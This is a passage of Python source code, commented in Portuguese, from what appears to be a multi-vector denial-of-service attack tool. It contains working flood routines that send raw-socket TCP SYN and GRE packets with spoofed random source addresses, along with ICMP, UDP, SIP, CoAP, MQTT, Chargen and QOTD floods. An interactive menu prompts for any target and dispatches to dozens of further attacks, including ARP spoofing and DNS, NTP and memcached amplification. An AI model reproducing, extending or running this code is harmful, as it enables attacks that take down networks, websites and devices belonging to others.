    while ATTACK_RUNNING and time.time() < endTime:
        try:
            # TCP SYN
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            ip_header = struct.pack("!BBHHHBBH4s4s", 69, 0, 40, random.randint(1, 65535), 0, 64, socket.IPPROTO_TCP, 0,
                                    socket.inet_aton(f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"), socket.inet_aton(target))
            tcp_header = struct.pack("!HHLLBBHHH", random.randint(1024, 65535), port, random.randint(1, 65535), 0, 2, 0, 65535, 0, 0)
            sock.sendto(ip_header + tcp_header + random._urandom(32768), (target, port))
            # HTTP
            session = requests.Session()
            session.proxies = {"http": proxy.address, "https": proxy.address}
            headers = {"User-Agent": agent, "Connection": "keep-alive"}
            session.get(f"http://{target}:{port}", headers=headers, timeout=0.01)
            print(Fore.GREEN + f"  [HYBRID-TCP-HTTP] Enviado para {target}:{port}" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

# Ataque Híbrido ICMP-UDP Flood
def hybrid_icmp_udp_flood(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            # ICMP
            ip = scapy.IP(src=scapy.RandIP(), dst=target)
            icmp = scapy.ICMP()
            packet = ip / icmp / random._urandom(65535)
            scapy.send(packet, verbose=0)
            # UDP
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = random._urandom(65507)
            sock.sendto(payload, (target, random.randint(1,65535)))
            print(Fore.GREEN + f"  [HYBRID-ICMP-UDP] Enviado para {target}" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

# Ataque Híbrido HTTP-SIP Flood
def hybrid_http_sip_flood(target, port, proxy, agent, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            # HTTP
            session = requests.Session()
            session.proxies = {"http": proxy.address, "https": proxy.address}
            headers = {"User-Agent": agent, "Connection": "keep-alive"}
            session.get(f"http://{target}:{port}", headers=headers, timeout=0.01)
            # SIP
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = b"INVITE sip:user@domain.com SIP/2.0\r\nVia: SIP/2.0/UDP 192.168.1.1\r\nFrom: <sip:attacker@domain.com>\r\nTo: <sip:user@domain.com>\r\nCall-ID: " + random._urandom(32).hex().encode() + b"\r\nCSeq: 1 INVITE\r\n\r\n" + random._urandom(32768)
            sock.sendto(payload, (target, 5060))
            print(Fore.GREEN + f"  [HYBRID-HTTP-SIP] Enviado para {target}" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

# Ataque Híbrido UDP-CoAP Flood
def hybrid_udp_coap_flood(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            # UDP
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = random._urandom(65507)
            sock.sendto(payload, (target, random.randint(1,65535)))
            # CoAP
            payload = b"\x40\x01" + random._urandom(8) + b"\xB3\x63\x6F\x72\x65" + random._urandom(32768)
            sock.sendto(payload, (target, 5683))
            print(Fore.GREEN + f"  [HYBRID-UDP-COAP] Enviado para {target}" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

# Ataque Híbrido TCP-MQTT Flood
def hybrid_tcp_mqtt_flood(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            # TCP
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            ip_header = struct.pack("!BBHHHBBH4s4s", 69, 0, 40, random.randint(1, 65535), 0, 64, socket.IPPROTO_TCP, 0,
                                    socket.inet_aton(f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"), socket.inet_aton(target))
            tcp_header = struct.pack("!HHLLBBHHH", random.randint(1024, 65535), 1883, random.randint(1, 65535), 0, 2, 0, 65535, 0, 0)
            sock.sendto(ip_header + tcp_header + random._urandom(32768), (target, 1883))
            # MQTT
            mqtt_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            mqtt_sock.settimeout(0.01)
            mqtt_sock.connect((target, 1883))
            mqtt_payload = b"\x10\x0E\x00\x04\x4D\x51\x54\x54\x04\x02\x00\x00\x00\x02\x41\x42" + random._urandom(32768)
            mqtt_sock.send(mqtt_payload)
            print(Fore.GREEN + f"  [HYBRID-TCP-MQTT] Enviado para {target}:1883" + Style.RESET_ALL)
            sock.close()
            mqtt_sock.close()
        except:
            pass
        time.sleep(0.0000001)

# Ataque GRE Flood (Exótico)
def gre_flood(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_GRE)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            ip_header = struct.pack("!BBHHHBBH4s4s", 69, 0, 40, random.randint(1, 65535), 0, 64, socket.IPPROTO_GRE, 0,
                                    socket.inet_aton(f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"), socket.inet_aton(target))
            gre_header = struct.pack("!HHHH", 0x0800, 0, random.randint(1, 65535), 0)
            payload = random._urandom(65535)  # 64KB payload
            sock.sendto(ip_header + gre_header + payload, (target, 0))
            print(Fore.GREEN + f"  [GRE] Enviado para {target}" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

# Ataque IP Fragment Flood (Exótico)
def ip_fragment_flood(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            ip_header = struct.pack("!BBHHHBBH4s4s", 69, 0, 1480, random.randint(1, 65535), 0, 64, socket.IPPROTO_UDP, 0,
                                    socket.inet_aton(f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"), socket.inet_aton(target))
            payload = random._urandom(1440) + b"x" * 32768  # 32KB adicional
            sock.sendto(ip_header + payload, (target, 0))
            print(Fore.GREEN + f"  [IP-FRAG] Enviado para {target}" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

# Ataque Chargen Flood (Exótico)
def chargen_flood(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = random._urandom(65535)  # 64KB payload
            sock.sendto(payload, (target, 19))
            print(Fore.GREEN + f"  [CHARGEN] Enviado para {target}:19" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

# Ataque QOTD Flood (Exótico)
def qotd_flood(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = random._urandom(65535)  # 64KB payload
            sock.sendto(payload, (target, 17))
            print(Fore.GREEN + f"  [QOTD] Enviado para {target}:17" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

# Ataque Híbrido HTTP-UDP Burst Flood
def hybrid_http_udp_burst_flood(target, port, proxy, agent, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            session = requests.Session()
            session.proxies = {"http": proxy.address, "https": proxy.address}
            headers = {"User-Agent": agent, "Connection": "keep-alive"}
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = random._urandom(65507)
            for _ in range(50):  # Burst de 50 pacotes
                session.get(f"http://{target}:{port}", headers=headers, timeout=0.01)
                sock.sendto(payload, (target, port))
            print(Fore.GREEN + f"  [HYBRID-HTTP-UDP-BURST] Enviado para {target}:{port}" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

# Ataque Híbrido TCP-SYN + SIP Flood
def hybrid_tcp_sip_flood(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            # TCP SYN
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            ip_header = struct.pack("!BBHHHBBH4s4s", 69, 0, 40, random.randint(1, 65535), 0, 64, socket.IPPROTO_TCP, 0,
                                    socket.inet_aton(f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"), socket.inet_aton(target))
            tcp_header = struct.pack("!HHLLBBHHH", random.randint(1024, 65535), 5060, random.randint(1, 65535), 0, 2, 0, 65535, 0, 0)
            sock.sendto(ip_header + tcp_header + random._urandom(32768), (target, 5060))
            # SIP
            sip_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = b"INVITE sip:user@domain.com SIP/2.0\r\nVia: SIP/2.0/UDP 192.168.1.1\r\nFrom: <sip:attacker@domain.com>\r\nTo: <sip:user@domain.com>\r\nCall-ID: " + random._urandom(32).hex().encode() + b"\r\nCSeq: 1 INVITE\r\n\r\n" + random._urandom(32768)
            sip_sock.sendto(payload, (target, 5060))
            print(Fore.GREEN + f"  [HYBRID-TCP-SIP] Enviado para {target}:5060" + Style.RESET_ALL)
            sock.close()
            sip_sock.close()
        except:
            pass
        time.sleep(0.0000001)

# Ataque GRE Burst Flood (Exótico)
def gre_burst_flood(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_GRE)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            ip_header = struct.pack("!BBHHHBBH4s4s", 69, 0, 40, random.randint(1, 65535), 0, 64, socket.IPPROTO_GRE, 0,
                                    socket.inet_aton(f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"), socket.inet_aton(target))
            gre_header = struct.pack("!HHHH", 0x0800, 0, random.randint(1, 65535), 0)
            payload = random._urandom(32768)
            for _ in range(50):  # Burst de 50 pacotes
                sock.sendto(ip_header + gre_header + payload, (target, 0))
            print(Fore.GREEN + f"  [GRE-BURST] Enviado para {target}" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

# Ataque IP Fragment Mass Flood (Exótico)
def ip_fragment_mass_flood(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            ip_header = struct.pack("!BBHHHBBH4s4s", 69, 0, 1480, random.randint(1, 65535), 0, 64, socket.IPPROTO_UDP, 0,
                                    socket.inet_aton(f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"), socket.inet_aton(target))
            payload = random._urandom(1440) + b"x" * 65535  # 64KB adicional
            sock.sendto(ip_header + payload, (target, 0))
            print(Fore.GREEN + f"  [IP-FRAG-MASS] Enviado para {target}" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

# Ataque Chargen Burst Flood (Exótico)
def chargen_burst_flood(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = random._urandom(32768)
            for _ in range(50):  # Burst de 50 pacotes
                sock.sendto(payload, (target, 19))
            print(Fore.GREEN + f"  [CHARGEN-BURST] Enviado para {target}:19" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

# Ataque QOTD Mass Flood (Exótico)
def qotd_mass_flood(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = random._urandom(65535) + b"x" * 32768  # 96KB payload
            sock.sendto(payload, (target, 17))
            print(Fore.GREEN + f"  [QOTD-MASS] Enviado para {target}:17" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

# Ataque Híbrido UDP-RTP Flood
def hybrid_udp_rtp_flood(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            # UDP
            payload = random._urandom(65507)
            sock.sendto(payload, (target, random.randint(1,65535)))
            # RTP
            rtp_payload = b"\x80\x08" + random._urandom(32768)
            sock.sendto(rtp_payload, (target, 5004))
            print(Fore.GREEN + f"  [HYBRID-UDP-RTP] Enviado para {target}" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

# Ataque Híbrido ICMP-CoAP Flood
def hybrid_icmp_coap_flood(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            # ICMP
            ip = scapy.IP(src=scapy.RandIP(), dst=target)
            icmp = scapy.ICMP()
            packet = ip / icmp / random._urandom(65535)
            scapy.send(packet, verbose=0)
            # CoAP
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = b"\x40\x01" + random._urandom(8) + b"\xB3\x63\x6F\x72\x65" + random._urandom(32768)
            sock.sendto(payload, (target, 5683))
            print(Fore.GREEN + f"  [HYBRID-ICMP-COAP] Enviado para {target}" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

# Ataque GRE Mass Flood (Exótico)
def gre_mass_flood(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_GRE)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            ip_header = struct.pack("!BBHHHBBH4s4s", 69, 0, 40, random.randint(1, 65535), 0, 64, socket.IPPROTO_GRE, 0,
                                    socket.inet_aton(f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"), socket.inet_aton(target))
            gre_header = struct.pack("!HHHH", 0x0800, 0, random.randint(1, 65535), 0)
            payload = random._urandom(65535) + b"x" * 32768  # 96KB payload
            sock.sendto(ip_header + gre_header + payload, (target, 0))
            print(Fore.GREEN + f"  [GRE-MASS] Enviado para {target}" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

# Ataque IP Fragment Burst Flood (Exótico)
def ip_fragment_burst_flood(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            ip_header = struct.pack("!BBHHHBBH4s4s", 69, 0, 1480, random.randint(1, 65535), 0, 64, socket.IPPROTO_UDP, 0,
                                    socket.inet_aton(f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"), socket.inet_aton(target))
            payload = random._urandom(1440)
            for _ in range(50):  # Burst de 50 pacotes
                sock.sendto(ip_header + payload + random._urandom(16384), (target, 0))
            print(Fore.GREEN + f"  [IP-FRAG-BURST] Enviado para {target}" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

# --- Código Atualizado Solicitado ---

def start_attack_broadcast(attack_func, target, broadcast_ip, duration):
    global ATTACK_RUNNING
    ATTACK_RUNNING = True
    threads = []
    for _ in range(THREADS):
        thread = threading.Thread(target=attack_func, args=(target, broadcast_ip, duration))
        threads.append(thread)
        thread.start()
    for thread in threads:
        thread.join()
    ATTACK_RUNNING = False
    print(Fore.GREEN + f"{attack_func.__name__.replace('_', ' ').title()} concluído!" + Style.RESET_ALL)

def main_control_loop(proxies, agents):
    global TARGET, PORT
    initialize_system()
    proxies = configure_proxies([Proxy(address=p) for p in PROXY_LIST]) if PROXY_LIST else []
    while True:
        choice = show_main_menu()
        if choice == 0:
            break
        elif choice == 12:
            proxies = configure_proxies([Proxy(address=p) for p in PROXY_LIST]) if PROXY_LIST else []
        elif choice == 13:
            domain = input(Fore.CYAN + "  Digite o domínio para verificar (ex.: example.com): " + Style.RESET_ALL)
            check_site_protection_and_geo(domain)
            input(Fore.CYAN + "  Pressione Enter para continuar..." + Style.RESET_ALL)
        elif choice == 14:
            os.system("start https://code-projects.redebots.shop") if os.name == "nt" else os.system("open https://code-projects.redebots.shop")
            input(Fore.CYAN + "  Pressione Enter para continuar..." + Style.RESET_ALL)
        else:
            TARGET = input(Fore.CYAN + "  Digite o alvo (IP ou domínio): " + Style.RESET_ALL)
            PORT = int(input(Fore.CYAN + "  Digite a porta (padrão 80): " + Style.RESET_ALL) or 80)
            duration = int(input(Fore.CYAN + "  Digite a duração (segundos): " + Style.RESET_ALL))

            if choice == 1:  # Ataques a Sites
                sub_choice = show_sites_menu()
                if sub_choice == 0: continue
                elif sub_choice == 1: start_attack(slowloris, TARGET, PORT, proxies, agents, duration)
                elif sub_choice == 2: start_attack(rudy_attack, TARGET, PORT, proxies, agents, duration)
                elif sub_choice == 3: start_attack(http_multi_method_flood, TARGET, PORT, proxies, agents, duration)
                elif sub_choice == 4: start_attack(http_keepalive_flood, TARGET, PORT, proxies, agents, duration)
                elif sub_choice == 5: start_attack(slow_read, TARGET, PORT, proxies, agents, duration)
                elif sub_choice == 6: start_attack(http_header_overload, TARGET, PORT, proxies, agents, duration)
                elif sub_choice == 7: start_attack(http_random_path_flood, TARGET, PORT, proxies, agents, duration)
                elif sub_choice == 8: start_attack(http_burst_multi_flood, TARGET, PORT, proxies, agents, duration)
                elif sub_choice == 9: start_attack(http_get_flood, TARGET, PORT, proxies, agents, duration)
                elif sub_choice == 10: start_attack(http_post_flood, TARGET, PORT, proxies, agents, duration)
                elif sub_choice == 11: start_attack(http_head_flood, TARGET, PORT, proxies, agents, duration)
                elif sub_choice == 12: start_attack(http_options_flood, TARGET, PORT, proxies, agents, duration)
                elif sub_choice == 13: start_attack(http_trace_flood, TARGET, PORT, proxies, agents, duration)
                elif sub_choice == 14: start_attack(http_put_flood, TARGET, PORT, proxies, agents, duration)
                elif sub_choice == 15: start_attack(http_delete_flood, TARGET, PORT, proxies, agents, duration)
                elif sub_choice == 16: start_attack(http_connect_flood, TARGET, PORT, proxies, agents, duration)
                elif sub_choice == 17: start_attack(http_patch_flood, TARGET, PORT, proxies, agents, duration)
                elif sub_choice == 18: start_attack(http_get_mass_flood, TARGET, PORT, proxies, agents, duration)
                elif sub_choice == 19: start_attack(http_post_burst_flood, TARGET, PORT, proxies, agents, duration)
                elif sub_choice == 20: start_attack(http_get_random_flood, TARGET, PORT, proxies, agents, duration)
                elif sub_choice == 21: start_attack(http_post_random_flood, TARGET, PORT, proxies, agents, duration)
                elif sub_choice == 22: start_attack(http_head_mass_flood, TARGET, PORT, proxies, agents, duration)
                elif sub_choice == 23: start_attack(http_options_burst_flood, TARGET, PORT, proxies, agents, duration)
                elif sub_choice == 24: start_attack(http_trace_mass_flood, TARGET, PORT, proxies, agents, duration)
                elif sub_choice == 25: start_attack(http_put_random_flood, TARGET, PORT, proxies, agents, duration)
                elif sub_choice == 26: start_attack(http_delete_burst_flood, TARGET, PORT, proxies, agents, duration)
                elif sub_choice == 27: start_attack(http_connect_random_flood, TARGET, PORT, proxies, agents, duration)
                elif sub_choice == 28: start_attack(http_patch_burst_flood, TARGET, PORT, proxies, agents, duration)
            elif choice == 2:  # Ataques a Dispositivos
                sub_choice = show_devices_menu()
                if sub_choice == 0: continue
                elif sub_choice == 1: start_attack_no_port(sip_flood, TARGET, duration)
                elif sub_choice == 2: start_attack_no_port(coap_flood, TARGET, duration)
                elif sub_choice == 3: start_attack_no_port(mqtt_flood, TARGET, duration)
                elif sub_choice == 4: start_attack_no_port(telnet_flood, TARGET, duration)
                elif sub_choice == 5: start_attack_no_port(sip_burst_flood, TARGET, duration)
                elif sub_choice == 6: start_attack_no_port(coap_mass_flood, TARGET, duration)
                elif sub_choice == 7: start_attack_no_port(mqtt_burst_flood, TARGET, duration)
                elif sub_choice == 8: start_attack_no_port(telnet_mass_flood, TARGET, duration)
                elif sub_choice == 9: start_attack_no_port(sip_random_flood, TARGET, duration)
                elif sub_choice == 10: start_attack_no_port(coap_burst_flood, TARGET, duration)
                elif sub_choice == 11: start_attack_no_port(mqtt_mass_flood, TARGET, duration)
                elif sub_choice == 12: start_attack_no_port(telnet_burst_flood, TARGET, duration)
                elif sub_choice == 13: start_attack_no_port(sip_mass_flood, TARGET, duration)
                elif sub_choice == 14: start_attack_no_port(coap_random_flood, TARGET, duration)
                elif sub_choice == 15: start_attack_no_port(mqtt_random_flood, TARGET, duration)
                elif sub_choice == 16: start_attack_no_port(telnet_random_flood, TARGET, duration)
                elif sub_choice == 17: start_attack_no_port(upnp_flood, TARGET, duration)
                elif sub_choice == 18: start_attack_no_port(snmp_flood, TARGET, duration)
                elif sub_choice == 19: start_attack_no_port(upnp_burst_flood, TARGET, duration)
                elif sub_choice == 20: start_attack_no_port(snmp_mass_flood, TARGET, duration)
                elif sub_choice == 21: start_attack_no_port(sip_high_rate_flood, TARGET, duration)
                elif sub_choice == 22: start_attack_no_port(coap_high_rate_flood, TARGET, duration)
                elif sub_choice == 23: start_attack_no_port(mqtt_high_rate_flood, TARGET, duration)
                elif sub_choice == 24: start_attack_no_port(telnet_high_rate_flood, TARGET, duration)
            elif choice == 3:  # Ataques de Rede Local e Reflexões
                sub_choice = show_network_reflection_menu()
                if sub_choice == 0: continue
                elif sub_choice == 1:
                    gateway_ip = input(Fore.CYAN + "  Digite o IP do gateway: " + Style.RESET_ALL)
                    start_attack_gateway(arp_spoof, TARGET, gateway_ip, duration)
                elif sub_choice == 2:
                    interface = input(Fore.CYAN + "  Digite a interface de rede (ex.: eth0): " + Style.RESET_ALL)
                    start_attack_interface(mac_flood, interface, duration)
                elif sub_choice == 3:
                    gateway_ip = input(Fore.CYAN + "  Digite o IP do gateway: " + Style.RESET_ALL)
                    start_attack_gateway(arp_burst_spoof, TARGET, gateway_ip, duration)
                elif sub_choice == 4:
                    interface = input(Fore.CYAN + "  Digite a interface de rede (ex.: eth0): " + Style.RESET_ALL)
                    start_attack_interface(mac_mass_flood, interface, duration)
                elif sub_choice == 5:
                    gateway_ip = input(Fore.CYAN + "  Digite o IP do gateway: " + Style.RESET_ALL)
                    start_attack_gateway(arp_random_spoof, TARGET, gateway_ip, duration)
                elif sub_choice == 6:
                    interface = input(Fore.CYAN + "  Digite a interface de rede (ex.: eth0): " + Style.RESET_ALL)
                    start_attack_interface(mac_burst_flood, interface, duration)
                elif sub_choice == 7:
                    gateway_ip = input(Fore.CYAN + "  Digite o IP do gateway: " + Style.RESET_ALL)
                    start_attack_gateway(arp_high_rate_spoof, TARGET, gateway_ip, duration)
                elif sub_choice == 8:
                    interface = input(Fore.CYAN + "  Digite a interface de rede (ex.: eth0): " + Style.RESET_ALL)
                    start_attack_interface(mac_high_rate_flood, interface, duration)
                elif sub_choice == 9: start_attack_no_port(dns_reflection, TARGET, duration)
                elif sub_choice == 10: start_attack_no_port(ntp_reflection, TARGET, duration)
                elif sub_choice == 11: start_attack_no_port(ssdp_reflection, TARGET, duration)
                elif sub_choice == 12: start_attack_no_port(snmp_reflection, TARGET, duration)
                elif sub_choice == 13: start_attack_no_port(dns_burst_reflection, TARGET, duration)
                elif sub_choice == 14: start_attack_no_port(ntp_mass_reflection, TARGET, duration)
                elif sub_choice == 15: start_attack_no_port(ssdp_burst_reflection, TARGET, duration)
                elif sub_choice == 16: start_attack_no_port(snmp_mass_reflection, TARGET, duration)
                elif sub_choice == 17: start_attack_no_port(dns_high_rate_reflection, TARGET, duration)
                elif sub_choice == 18: start_attack_no_port(ntp_burst_reflection, TARGET, duration)
                elif sub_choice == 19: start_attack_no_port(ssdp_high_rate_reflection, TARGET, duration)
                elif sub_choice == 20: start_attack_no_port(snmp_burst_reflection, TARGET, duration)
            elif choice == 4:  # Ataques a IPs
                sub_choice = show_ips_menu()
                if sub_choice == 0: continue
                elif sub_choice == 1: start_tcp_attack(syn_flood, TARGET, PORT, duration)
                elif sub_choice == 2: start_tcp_attack(tcp_rst_flood, TARGET, PORT, duration)
                elif sub_choice == 3: start_tcp_attack(tcp_fin_flood, TARGET, PORT, duration)
                elif sub_choice == 4: start_tcp_attack(tcp_ack_flood, TARGET, PORT, duration)
                elif sub_choice == 5: start_tcp_attack(tcp_psh_flood, TARGET, PORT, duration)
                elif sub_choice == 6: start_tcp_attack(tcp_xmas_flood, TARGET, PORT, duration)
                elif sub_choice == 7: start_tcp_attack(tcp_null_flood, TARGET, PORT, duration)
                elif sub_choice == 8: start_tcp_attack(tcp_land_flood, TARGET, PORT, duration)
            elif choice == 5:  # Ataques ICMP e Amplificação
                sub_choice = show_icmp_amplification_menu()
                if sub_choice == 0: continue
                elif sub_choice == 1: start_attack_no_port(icmp_flood, TARGET, duration)
                elif sub_choice == 2:
                    broadcast_ip = input(Fore.CYAN + "  Digite o IP de broadcast (ex.: 192.168.1.255): " + Style.RESET_ALL)
                    start_attack_broadcast(icmp_smurf, TARGET, broadcast_ip, duration)
                elif sub_choice == 3: start_attack_no_port(icmp_ping_flood, TARGET, duration)
                elif sub_choice == 4: start_attack_no_port(icmp_burst_flood, TARGET, duration)
                elif sub_choice == 5: start_attack_no_port(icmp_mass_flood, TARGET, duration)
                elif sub_choice == 6: start_attack_no_port(icmp_random_flood, TARGET, duration)
                elif sub_choice == 7:
                    broadcast_ip = input(Fore.CYAN + "  Digite o IP de broadcast (ex.: 192.168.1.255): " + Style.RESET_ALL)
                    start_attack_broadcast(icmp_smurf_burst, TARGET, broadcast_ip, duration)
                elif sub_choice == 8: start_attack_no_port(dns_amplification, TARGET, duration)
                elif sub_choice == 9: start_attack_no_port(ntp_amplification, TARGET, duration)
                elif sub_choice == 10: start_attack_no_port(ssdp_amplification, TARGET, duration)
                elif sub_choice == 11: start_attack_no_port(snmp_amplification, TARGET, duration)
                elif sub_choice == 12: start_attack_no_port(cldap_amplification, TARGET, duration)
                elif sub_choice == 13: start_attack_no_port(memcached_amplification, TARGET, duration)
                elif sub_choice == 14: start_attack_no_port(ldap_amplification, TARGET, duration)
                elif sub_choice == 15: start_attack_no_port(chargen_amplification, TARGET, duration)
                elif sub_choice == 16: start_attack_no_port(qotd_amplification, TARGET, duration)
                elif sub_choice == 17: start_attack_no_port(dns_burst_amplification, TARGET, duration)
                elif sub_choice == 18: start_attack_no_port(ntp_mass_amplification, TARGET, duration)
                elif sub_choice == 19: start_attack_no_port(ssdp_mass_amplification, TARGET, duration)
                elif sub_choice == 20: start_attack_no_port(snmp_burst_amplification, TARGET, duration)
                elif sub_choice == 21: start_attack_no_port(cldap_mass_amplification, TARGET, duration)
                elif sub_choice == 22: start_attack_no_port(memcached_burst_amplification, TARGET, duration)
                elif sub_choice == 23: start_attack_no_port(ldap_burst_amplification, TARGET, duration)
            elif choice == 6:  # Ataques a Serviços
                sub_choice = show_services_menu()
                if sub_choice == 0: continue
                elif sub_choice == 1: start_attack_no_port(ftp_flood, TARGET, duration)
                elif sub_choice == 2: start_attack_no_port(smtp_flood, TARGET, duration)
                elif sub_choice == 3: start_attack_no_port(dns_service_flood, TARGET, duration)
                elif sub_choice == 4: start_attack_no_port(ssh_flood, TARGET, duration)
                elif sub_choice == 5: start_attack_no_port(http_service_flood, TARGET, duration)
                elif sub_choice == 6: start_attack_no_port(ftp_burst_flood, TARGET, duration)
                elif sub_choice == 7: start_attack_no_port(smtp_mass_flood, TARGET, duration)
                elif sub_choice == 8: start_attack_no_port(dns_service_burst_flood, TARGET, duration)
                elif sub_choice == 9: start_attack_no_port(ssh_mass_flood, TARGET, duration)
                elif sub_choice == 10: start_attack_no_port(http_service_mass_flood, TARGET, duration)
                elif sub_choice == 11: start_attack_no_port(ftp_random_flood, TARGET, duration)
                elif sub_choice == 12: start_attack_no_port(smtp_burst_flood, TARGET, duration)
                elif sub_choice == 13: start_attack_no_port(dns_service_mass_flood, TARGET, duration)
                elif sub_choice == 14: start_attack_no_port(ssh_burst_flood, TARGET, duration)
                elif sub_choice == 15: start_attack_no_port(http_service_burst_flood, TARGET, duration)
                elif sub_choice == 16: start_attack_no_port(ftp_high_rate_flood, TARGET, duration)
                elif sub_choice == 17: start_attack_no_port(smtp_random_flood, TARGET, duration)
                elif sub_choice == 18: start_attack_no_port(dns_service_high_rate_flood, TARGET, duration)
                elif sub_choice == 19: start_attack_no_port(ssh_random_flood, TARGET, duration)
                elif sub_choice == 20: start_attack_no_port(http_service_random_flood, TARGET, duration)
                elif sub_choice == 21: start_attack_no_port(pop3_flood, TARGET, duration)
                elif sub_choice == 22: start_attack_no_port(imap_flood, TARGET, duration)
